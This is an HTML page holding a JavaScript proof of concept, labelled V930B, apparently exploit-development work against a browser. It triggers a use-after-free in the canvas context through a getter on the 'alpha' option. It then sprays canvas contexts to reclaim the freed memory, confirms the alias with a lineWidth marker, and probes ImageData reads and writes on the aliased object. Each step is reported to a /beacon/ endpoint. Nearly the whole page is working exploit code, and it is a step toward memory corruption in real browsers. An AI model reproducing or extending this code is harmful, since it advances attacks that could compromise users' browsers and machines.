<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>V930B</title></head>
<body><pre id="out">V930B — ImageData surface on live alias (safe diag, B-session)</pre>
<script>
'use strict';
var O=document.getElementById('out');
function say(s){O.textContent+='\n'+s;}
function bk(tag,body){
  try{new Image().src='/beacon/V930B-'+tag+'?d='+encodeURIComponent(String(body).slice(0,500))+'&t='+Date.now()+'&s=1';}catch(e){}
}
function hexHead(u8,n){ var a=[]; for(var i=0;i<Math.min(n,u8.length);i++) a.push(u8[i].toString(16)); return a.join(','); }

var P=new URLSearchParams(location.search);
var NSAVES=+(P.get('saves')||'32');
var NSPRAY=+(P.get('spray')||'300');
var MARKER=+(P.get('marker')||'7777.77');

bk('BOOT','saves='+NSAVES+',spray='+NSPRAY+',marker='+MARKER);

/* UAF (V573 pattern) */
var innerCtx=null;
(function(){
  var c=document.createElement('canvas'); c.width=1; c.height=1;
  var d={};
  Object.defineProperty(d,'alpha',{get:function(){
    var ctx=c.getContext('2d'); innerCtx=ctx;
    for(var s=0;s<NSAVES;s++) ctx.save();
    ctx.lineWidth=1.0; return true;
  }});
  try{ c.getContext('bitmaprenderer',d); }catch(e){ bk('TRIG-ERR',e.message); }
})();
bk('POST-UAF','ctx='+(innerCtx?'OK':'NULL'));
if(!innerCtx){ bk('FAIL','no-inner'); }

/* same-type spray */
var sprayCtxs=[], sprayCanv=[];
for(var i=0;i<NSPRAY;i++){
  var sc=document.createElement('canvas'); sc.width=4; sc.height=4; /* small backing store */
  var sctx=sc.getContext('2d');
  if(sctx){ sctx.lineWidth=MARKER; sprayCtxs.push(sctx); sprayCanv.push(sc); }
}
bk('SPRAY','n='+sprayCtxs.length);

/* confirm alias */
var lwR, aliasCtx=null, aliasIdx=-1, aliasCanv=null, errR;
try { lwR=innerCtx.lineWidth; } catch(e){ errR='lw:'+e.message; }
if(errR){ bk('READ','ERR:'+String(errR).slice(0,200)); }
else {
  bk('READ','lw='+lwR);
  if(lwR===MARKER){
    bk('RECLAIM','CONFIRMED');
    try{ innerCtx.lineWidth=9999.99; }catch(e){}
    for(var i=0;i<sprayCtxs.length;i++){
      try{ if(sprayCtxs[i].lineWidth===9999.99){ aliasCtx=sprayCtxs[i]; aliasIdx=i; aliasCanv=sprayCanv[i]; break; } }catch(e){}
    }
    bk('ALIAS','idx='+aliasIdx+',found='+(aliasCtx?'1':'0'));
  } else { bk('RECLAIM','NO-marker lw='+lwR); }
}

var live = aliasCtx || innerCtx;
var canv = aliasCanv || (function(){ var c=document.createElement('canvas'); c.width=4; c.height=4; return c; })();

function t(name, fn){
  try{ bk('T-PRE',name); var r=fn(); bk('T-OK',name+'|'+String(r).slice(0,420)); say('T-OK '+name+' '+r); }
  catch(e){ bk('T-ERR',name+'|'+e.name+':'+String(e.message).slice(0,160)); say('T-ERR '+name+' '+e.message); }
}

if(live){
  bk('ID-START','target='+(aliasCtx?'alias-spray#'+aliasIdx:'innerCtx')+',cw='+canv.width+',ch='+canv.height);

  t('createImageData(4,4)', function(){
    var id = live.createImageData(4,4);
    return 'w='+id.width+',h='+id.height+',len='+id.data.length+',ctor='+id.data.constructor.name+',head='+hexHead(id.data,8);
  });

  t('fill+getImageData(0,0,4,4)', function(){
    live.fillStyle = 'rgba(10,20,30,255)';
    live.fillRect(0,0,4,4);
    var id = live.getImageData(0,0,4,4);
    return 'w='+id.width+',h='+id.height+',len='+id.data.length+',p0='+[id.data[0],id.data[1],id.data[2],id.data[3]].join(':')+',ctor='+id.data.constructor.name;
  });

  t('putImageData roundtrip', function(){
    var id = live.createImageData(2,2);
    for(var i=0;i<id.data.length;i+=4){ id.data[i]=1; id.data[i+1]=2; id.data[i+2]=3; id.data[i+3]=4; }
    live.putImageData(id,0,0);
    var id2 = live.getImageData(0,0,2,2);
    var ok = (id2.data[0]===1&&id2.data[1]===2&&id2.data[2]===3&&id2.data[3]===4);
    return 'ok='+ok+',p0='+[id2.data[0],id2.data[1],id2.data[2],id2.data[3]].join(':');
  });

  t('getImageData cross(inner vs alias)', function(){
    if(!aliasCtx || !innerCtx) return 'skip(no-pair)';
    var c=document.createElement('canvas'); c.width=4; c.height=4;
    /* draw via innerCtx? innerCtx is stale wrapper to same object as aliasCtx; safer use live on its own canvas */
    live.fillStyle='#336699'; live.fillRect(0,0,4,4);
    var a = aliasCtx.getImageData(0,0,1,1).data;
    var b = innerCtx.getImageData(0,0,1,1).data;
    var eq = (a[0]===b[0]&&a[1]===b[1]&&a[2]===b[2]&&a[3]===b[3]);
    return 'eq='+eq+',a='+[a[0],a[1],a[2],a[3]].join(':')+',b='+[b[0],b[1],b[2],b[3]].join(':');
  });

  t('ImageData buffer props', function(){
    var id = live.getImageData(0,0,2,2);
    var buf = id.data.buffer;
    return 'byteLen='+buf.byteLength+',bufCtor='+buf.constructor.name+',isView='+(ArrayBuffer.isView(id.data));
  });

  bk('ID-DONE','complete|note=surface-diag-no-ptr-leak-expected');
} else {
  bk('ID-SKIP','no-live-ctx');
}

bk('DONE','complete');
say('\nV930B complete.');
</script>
</body></html>
